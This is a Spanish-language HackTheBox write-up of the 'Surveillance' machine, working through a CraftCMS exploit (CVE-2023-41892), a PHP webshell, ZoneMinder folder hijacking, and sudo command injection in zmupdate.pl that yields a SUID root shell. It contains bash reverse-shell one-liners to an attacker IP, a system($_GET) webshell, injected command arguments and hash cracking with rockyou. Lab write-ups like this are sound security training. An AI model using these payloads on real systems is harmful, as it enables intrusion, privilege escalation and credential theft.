---
title: "Máquina Surveillance"
description: "Resolución de la máquina Surveillance de HackTheBox"
tags: ['CVE-2023-41892', 'Command Injection', 'CVE-2023-26035']
categories: ['HackTheBox', 'Linux', 'Medium']
logo: '/assets/writeups/surveillance/logo.webp'
---

En esta máquina tendremos un CraftCMS vulnerable al CVE-2023-41892, luego obtendremos control de un usuario que corre un servicio interno de control de camaras IP con muchos permisos asignados en sudo, y uno de ellos es para un script de Perl vulnerable a inyección de comandos.

> Cabe recalcar que esta es la via no intencionada por la cual logré hackear la máquina, en el extra explicaré la forma intencional.
{: .prompt-info }

## Reconocimiento

La máquina solo tiene dos puertos abiertos

```bash
# Nmap 7.94 scan initiated Mon Apr 29 20:31:09 2024 as: nmap -sS -Pn -n -p- --open -oN ports --min-rate 100 -vvv 10.10.11.245
Nmap scan report for 10.10.11.245
Host is up, received user-set (0.32s latency).
Scanned at 2024-04-29 20:31:09 -04 for 396s
Not shown: 61704 closed tcp ports (reset), 3829 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Mon Apr 29 20:37:45 2024 -- 1 IP address (1 host up) scanned in 396.41 seconds
```

El sitio web `surveillance.htb` al que nos manda el servicio http es de un servicio de gestión de vigilancia casera británico fundado en 2010

![Site](/assets/writeups/surveillance/1.png)

Del resto, no parece tener otra cosa. Es una landing page.

## Intrusión

### www-data

Si vemos el footer de la página, hayaremos algo interesante

![CraftCMS](/assets/writeups/surveillance/2.png)

Está usando el gestor de contenido CraftCMS, que tiene una vulnerabilidad reciente con un CVSS de 10.0

> CVE-2023-41892:
> Craft CMS is a platform for creating digital experiences. This is a high-impact, low-complexity attack vector. Users running Craft installations before 4.4.15 are encouraged to update to at least that version to mitigate the issue. This issue has been fixed in Craft CMS 4.4.15.

Viendo el código fuente de la página podremos ver que la versión es la 4.4.14, la cual está en el rango de versiones vulnerables.

Hay varios PoCs por GitHub e incluso un módulo en Metasploit. Analizando el código de alguno de estos podremos ver que el exploit en cuestión consiste en una inicialización de objetos arbitraria en la cual el atacante no requiere de ningún tipo de privilegios, uno de los PoCs por ejemplo aprovecha esto para instanciar ImageMagick, explotarlo y dejar una archivo PHP malicioso en la carpeta donde reside el CMS. Muy similar a lo que hice en la máquina [Intentions](/posts/intentions)

Editando un poco y ejecutando uno de los PoCs, logramos dejar una shell PHP con la cual podemos ejecutar comandos.

```bash
❯ python craft-cms.py http://surveillance.htb
[+] Executing phpinfo to extract some config infos
temporary directory: /tmp
web server root: /var/www/html/craft/web
[+] create shell.php in /tmp
[+] trick imagick to move shell.php in /var/www/html/craft/web

[+] Webshell is deployed: http://surveillance.htb/shell.php?cmd=whoami
[+] Remember to delete shell.php in /var/www/html/craft/web when you're done

[!] Enjoy your shell

> ls
cpresources
css
fonts
images
img
index.php
js
shell.php
web.config
```

Vamos a movernos a una reverse shell ya que hay una tarea de limpiado corriendo en la máquina, y es un poco agresiva

```bash
> bash -c "bash -i >& /dev/tcp/10.10.14.10/443 0>&1"
```

```bash
❯ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.245 60646
bash: cannot set terminal process group (1090): Inappropriate ioctl for device
bash: no job control in this shell
www-data@surveillance:~/html/craft/web$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@surveillance:~/html/craft/web$ ^Z
[1]  + 8262 suspended  nc -lvnp 443

❯ stty raw -echo; fg
[1]  + 8262 continued  nc -lvnp 443
                                   reset xterm
www-data@surveillance:~/html/craft/web$ export TERM=xterm-256color
www-data@surveillance:~/html/craft/web$ source /etc/skel/.bashrc
www-data@surveillance:~/html/craft/web$ stty rows 34 columns 149
```

### zoneminder

Okay, si vemos los puertos abiertos encontraremos uno peculiar:

```bash
www-data@surveillance:~/html/craft/web$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      5 10.10.11.245:60646      10.10.14.10:443         ESTABLISHED
tcp6       0      0 :::22                   :::*                    LISTEN     
```

El 8080 está abierto y no está expuesto al exterior, y viendo el HTML con curl parece ser de un software conocido como [ZoneMinder](https://es.wikipedia.org/wiki/ZoneMinder)

> Es un software para el seguimiento a través de circuito cerrado de televisión (Wikipedia)

```bash
www-data@surveillance:~/html/craft/web$ curl -v http://127.0.0.1:8080
*   Trying 127.0.0.1:8080...
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET / HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Tue, 30 Apr 2024 01:13:08 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Set-Cookie: ZMSESSID=sg8u2f50kujopt0ogt9ijjja01; expires=Tue, 30-Apr-2024 02:13:07 GMT; Max-Age=3600; path=/; HttpOnly; SameSite=Strict
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Set-Cookie: zmSkin=classic; expires=Thu, 09-Mar-2034 01:13:07 GMT; Max-Age=311040000; SameSite=Strict
< Set-Cookie: zmCSS=base; expires=Thu, 09-Mar-2034 01:13:07 GMT; Max-Age=311040000; SameSite=Strict
< Content-Security-Policy: script-src 'self' 'nonce-78c7ab9b6853da1b66d9ecaacbcd0e96'
```

Peeeero antes de verlo, viendo los archivos de la máquina encontramos algo curioso:

```bash
www-data@surveillance:/usr/share/zoneminder/www$ ls -la
total 68
drwxr-xr-x 13 root     zoneminder 4096 Oct 17  2023 .
drwxr-xr-x  4 www-data www-data   4096 Oct 17  2023 ..
drwxr-xr-x  3 root     zoneminder 4096 Oct 17  2023 ajax
drwxr-xr-x  4 root     zoneminder 4096 Oct 17  2023 api
drwxr-xr-x  2 root     zoneminder 4096 Oct 17  2023 css
drwxr-xr-x  2 root     zoneminder 4096 Oct 17  2023 fonts
drwxr-xr-x  2 root     zoneminder 4096 Oct 17  2023 graphics
drwxr-xr-x  4 root     zoneminder 4096 Oct 17  2023 includes
-rw-r--r--  1 root     zoneminder 9294 Nov 18  2022 index.php
drwxr-xr-x  2 root     zoneminder 4096 Oct 17  2023 js
drwxr-xr-x  2 root     zoneminder 4096 Oct 17  2023 lang
-rw-r--r--  1 root     zoneminder   29 Nov 18  2022 robots.txt
drwxr-xr-x  3 root     zoneminder 4096 Oct 17  2023 skins
drwxr-xr-x  5 root     zoneminder 4096 Oct 17  2023 vendor
drwxr-xr-x  2 root     zoneminder 4096 Oct 17  2023 views
www-data@surveillance:/usr/share/zoneminder/www$ cd ..
www-data@surveillance:/usr/share/zoneminder$ ls -al
total 48
drwxr-xr-x   4 www-data www-data    4096 Oct 17  2023 .
drwxr-xr-x 151 root     root        4096 Nov  9 13:05 ..
drwxr-xr-x   2 root     zoneminder 36864 Oct 17  2023 db
drwxr-xr-x  13 root     zoneminder  4096 Oct 17  2023 www
www-data@surveillance:/usr/share/zoneminder$
```

Aunque las carpetas `db` y `www` sean propiedad de root, nosotros poseemos la propiedad de la carpeta `/usr/share/zoneminder` en si, lo que significa que podemos copiarnos la carpeta www, renombrar la que ya existe y colocar la copia que hicimos en su lugar, lo que nos dará privilegio de editar todos los archivos de la web a gusto:

```bash
www-data@surveillance:/usr/share/zoneminder$ cp -r www www2
www-data@surveillance:/usr/share/zoneminder$ mv www a
www-data@surveillance:/usr/share/zoneminder$ mv www2 www
www-data@surveillance:/usr/share/zoneminder$ ls -la
total 52
drwxr-xr-x   5 www-data www-data    4096 Apr 30 01:19 .
drwxr-xr-x 151 root     root        4096 Nov  9 13:05 ..
drwxr-xr-x  13 root     zoneminder  4096 Oct 17  2023 a
drwxr-xr-x   2 root     zoneminder 36864 Oct 17  2023 db
drwxr-xr-x  13 www-data www-data    4096 Apr 30 01:19 www
```

E interesantemente, esta web se ejecuta en PHP como vimos en los archivos de antes, por lo que simplemente colocar una shell nos dará ejecución de comandos... ¡y como otro usuario!

```bash
www-data@surveillance:/usr/share/zoneminder/www$ cat test.php
<?php
  echo system($_GET['uwu']);
?>
www-data@surveillance:/usr/share/zoneminder/www$ curl -v "http://127.0.0.1:8080/test.php?uwu=whoami"
*   Trying 127.0.0.1:8080...
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET /test.php?uwu=whoami HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Tue, 30 Apr 2024 01:23:25 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< 
zoneminder
* Connection #0 to host 127.0.0.1 left intact
```

```bash
www-data@surveillance:/usr/share/zoneminder/www$ curl -v "http://127.0.0.1:8080/test.php?uwu=bash%20-c%20'bash%20-i%20>%26/dev/tcp/10.10.14.10/443%20>%261'"
```

```bash
❯ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.245 54528
bash: cannot set terminal process group (1090): Inappropriate ioctl for device
bash: no job control in this shell
zoneminder@surveillance:/usr/share/zoneminder/www$ script /dev/null -c bash
... [snip]
```

### root

> Wait, what?
> Yes, seguramente te quedaste extrañado; reitero que esta es la forma no intencionada en la que la resolví
{: .prompt-info }

Este usuario puede hacer cosas interesantes...

```bash
zoneminder@surveillance:/usr/share/zoneminder/www$ sudo -l
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
```

Podemos ejecutar una buena lista de scripts de Perl que pertenecen al ZoneMinder:

```bash
zoneminder@surveillance:/usr/share/zoneminder/www$ ls -la /usr/bin/zm*.pl
-rwxr-xr-x 1 root root 43027 Nov 23  2022 /usr/bin/zmaudit.pl
-rwxr-xr-x 1 root root 12939 Nov 23  2022 /usr/bin/zmcamtool.pl
-rwxr-xr-x 1 root root  6043 Nov 23  2022 /usr/bin/zmcontrol.pl
-rwxr-xr-x 1 root root 26232 Nov 23  2022 /usr/bin/zmdc.pl
-rwxr-xr-x 1 root root 35206 Nov 23  2022 /usr/bin/zmfilter.pl
-rwxr-xr-x 1 root root  5640 Nov 23  2022 /usr/bin/zmonvif-probe.pl
-rwxr-xr-x 1 root root 19386 Nov 23  2022 /usr/bin/zmonvif-trigger.pl
-rwxr-xr-x 1 root root 13994 Nov 23  2022 /usr/bin/zmpkg.pl
-rwxr-xr-x 1 root root 17492 Nov 23  2022 /usr/bin/zmrecover.pl
-rwxr-xr-x 1 root root  4815 Nov 23  2022 /usr/bin/zmstats.pl
-rwxr-xr-x 1 root root  2133 Nov 23  2022 /usr/bin/zmsystemctl.pl
-rwxr-xr-x 1 root root 13111 Nov 23  2022 /usr/bin/zmtelemetry.pl
-rwxr-xr-x 1 root root  5340 Nov 23  2022 /usr/bin/zmtrack.pl
-rwxr-xr-x 1 root root 18482 Nov 23  2022 /usr/bin/zmtrigger.pl
-rwxr-xr-x 1 root root 45421 Nov 23  2022 /usr/bin/zmupdate.pl
-rwxr-xr-x 1 root root  8205 Nov 23  2022 /usr/bin/zmvideo.pl
-rwxr-xr-x 1 root root  7022 Nov 23  2022 /usr/bin/zmwatch.pl
-rwxr-xr-x 1 root root 19655 Nov 23  2022 /usr/bin/zmx10.pl
```

Inspecionando el código de cada uno, encontraremos algo interesante en el `/usr/bin/zmupdate.pl`

```perl
... [snip]
   if ( $response =~ /^[yY]$/ ) {
      my ( $host, $portOrSocket ) = ( $Config{ZM_DB_HOST} =~ /^([^:]+)(?::(.+))?$/ );
      my $command = 'mysqldump';
      if ($super) {
        $command .= ' --defaults-file=/etc/mysql/debian.cnf';
      } elsif ($dbUser) {
        $command .= ' -u'.$dbUser;
        $command .= ' -p\''.$dbPass.'\'' if $dbPass;
      }
      if ( defined($portOrSocket) ) {
        if ( $portOrSocket =~ /^\// ) {
          $command .= ' -S'.$portOrSocket;
        } else {
          $command .= ' -h'.$host.' -P'.$portOrSocket;
        }
      } else {
        $command .= ' -h'.$host;
      }
      my $backup = '/tmp/zm/'.$Config{ZM_DB_NAME}.'-'.$version.'.dump';
      $command .= ' --add-drop-table --databases '.$Config{ZM_DB_NAME}.' > '.$backup;
      print("Creating backup to $backup. This may take several minutes.\n");
      ($command) = $command =~ /(.*)/; # detaint
      print("Executing '$command'\n") if logDebugging();
      my $output = qx($command);
... [snip]
```

La función de actualizar a alguna versión te hace un prompt para saber si deseas hacer un respaldo de la db de ZoneMinder, al responder `yes`, va a ejecutar el comando `mysqldump` de forma insegura por lo que se ve, podemos comprobarlo fácilmente agregando input malicioso al comando en cuestión:

```bash
zoneminder@surveillance:/usr/share/zoneminder/www$ sudo -u root /usr/bin/zmupdate.pl -v 1.3.1 -u "\$(uname -a)" -p asd

Initiating database upgrade to version 1.36.32 from version 1.3.1

WARNING - You have specified an upgrade from version 1.3.1 but the database version found is 1.36.32. Is this correct?
Press enter to continue or ctrl-C to abort : 

Do you wish to take a backup of your database prior to upgrading?
This may result in a large file in /tmp/zm if you have a lot of events.
Press 'y' for a backup or 'n' to continue : y
Creating backup to /tmp/zm/zm-1.3.1.dump. This may take several minutes.
mysqldump: Got error: 1698: "Access denied for user 'Linux'@'localhost'" when trying to connect
Output: 
Command 'mysqldump -u$(uname -a) -p'asd' -hlocalhost --add-drop-table --databases zm > /tmp/zm/zm-1.3.1.dump' exited with status: 2
```

Podemos simplemente hacer que nos cree una bash SUID en `/tmp/` y ya podremos ir por las dos flags.

```bash
zoneminder@surveillance:/usr/share/zoneminder/www$ sudo -u root /usr/bin/zmupdate.pl -v 1.3.1 -u "\$(cp /bin/bash /tmp/uwu && chmod u+s /tmp/uwu)" -p sd
... [snip]
zoneminder@surveillance:/usr/share/zoneminder/www$ ls -la /tmp/uwu
-rwsr-xr-x 1 root root 1396520 Apr 30 01:44 /tmp/uwu
zoneminder@surveillance:/usr/share/zoneminder/www$ /tmp/uwu -p
uwu-5.1# source /etc/skel/.bashrc
zoneminder@surveillance:/usr/share/zoneminder/www# id
uid=1001(zoneminder) gid=1001(zoneminder) euid=0(root) groups=1001(zoneminder)
zoneminder@surveillance:/usr/share/zoneminder/www# cd /root
zoneminder@surveillance:/root# ls -la
total 40
drwx------  7 root root 4096 Apr 28 21:02 .
drwxr-xr-x 18 root root 4096 Nov  9 13:19 ..
lrwxrwxrwx  1 root root    9 Sep  6  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  3 root root 4096 Sep 19  2023 .cache
drwxr-xr-x  3 root root 4096 Sep 19  2023 .config
drwxr-xr-x  3 root root 4096 Sep  8  2023 .local
lrwxrwxrwx  1 root root    9 Oct 17  2023 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
drwxr-xr-x  2 root root 4096 Oct 21  2023 .scripts
drwx------  2 root root 4096 Nov  7 20:07 .ssh
-rw-r-----  1 root root   33 Apr 28 21:02 root.txt
zoneminder@surveillance:/root# cat root.txt
26eba4c95197606d362d******
zoneminder@surveillance:/root# cd /home
zoneminder@surveillance:/home# ls
matthew  zoneminder
zoneminder@surveillance:/home# cd matthew
zoneminder@surveillance:/home/matthew# ls
user.txt
zoneminder@surveillance:/home/matthew# cat user.txt
c2931b25fd2f76d1bb12be2b93******
```

## Extra

### Forma intencionada (user - matthew)

En la carpeta del CraftCMS, especificamente en `craft/storage/backups/` hay un backup:

```bash
zoneminder@surveillance:/var/www/html/craft/storage/backups# ls -la
total 28
drwxrwxr-x 2 www-data www-data  4096 Oct 17  2023 .
drwxr-xr-x 6 www-data www-data  4096 Oct 11  2023 ..
-rw-r--r-- 1 root     root     19918 Oct 17  2023 surveillance--2023-10-17-202801--v4.4.14.sql.zip
```

Tiene un dump de la base de datos MySQL:

```bash
zoneminder@surveillance:/var/www/html/craft/storage/backups# unzip -l surveillance--2023-10-17-202801--v4.4.14.sql.zip 
Archive:  surveillance--2023-10-17-202801--v4.4.14.sql.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
   113365  2023-10-17 20:33   surveillance--2023-10-17-202801--v4.4.14.sql
---------                     -------
   113365                     1 file
```

Descargándolo a nuestro equipo e inspecionando, encontraremos un hash de un usuario que no está en el MySQL actualmente conectado:

```sql
... [snip]
LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
set autocommit=0;
INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
commit;
```

No parece ser muy fuerte...

```bash
❯ john hash --format=Raw-SHA256 -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
starcraft122490  (?)
1g 0:00:00:00 DONE (2024-04-29 21:58) 2.500g/s 8929Kp/s 8929Kc/s 8929KC/s stefon22..srflirtsalot
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed
```

El usuario `matthew` que vimos en este dump y en `/home`, tiene permitido el acceso por SSH, por lo que simplemente podemos intentar entrar con esta contraseña y tomar nuestra flag... y funciona

```bash
❯ /usr/bin/ssh matthew@surveillance.htb
The authenticity of host 'surveillance.htb (10.10.11.245)' can't be established.
ED25519 key fingerprint is SHA256:Q8HdGZ3q/X62r8EukPF0ARSaCd+8gEhEJ10xotOsBBE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'surveillance.htb' (ED25519) to the list of known hosts.
matthew@surveillance.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Apr 30 02:01:19 AM UTC 2024

  System load:  0.080078125       Processes:             234
  Usage of /:   82.2% of 5.91GB   Users logged in:       0
  Memory usage: 23%               IPv4 address for eth0: 10.10.11.245
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Apr 29 19:47:57 2024 from 10.10.14.29
matthew@surveillance:~$ ls
user.txt
```

### Forma intencionada (zoneminder)

La forma intencionada de entrar como el usuario zoneminder era abusar del CVE-2023-26035 una vez comprometido matthew. Consiste en una inyección de comandos sin necesidad de privilegios al crear snapshots de monitores, simplemente podías ejecutar este [PoC](https://github.com/rvizx/CVE-2023-26035/blob/main/exploit.py) de rvizx por ejemplo, y ya tendrías al usuario zoneminder comprometido.
